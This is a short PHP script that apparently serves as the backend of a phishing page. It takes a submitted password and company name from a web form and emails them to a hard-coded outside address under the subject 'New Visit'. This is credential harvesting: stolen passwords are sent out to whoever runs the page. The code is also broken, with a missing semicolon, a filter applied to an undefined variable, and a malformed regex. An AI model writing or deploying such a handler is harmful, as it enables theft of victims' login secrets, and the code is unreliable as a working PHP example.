<?php

$button = $_POST["button"];
$password = $_POST["password"]

$send = "A request for data has been submitted by password: ".$password." for company ".$button;

function
filter_email_header($form_field) {
    return
    preg_replace('/[nr|!/$%*&]+/',' ',$form_field);
}

$email = filter_email_header($email);

$headers = "From: $email";
$sent = mail('jeremiahbooker82@gmail.com', 'New Visit', $send);

?>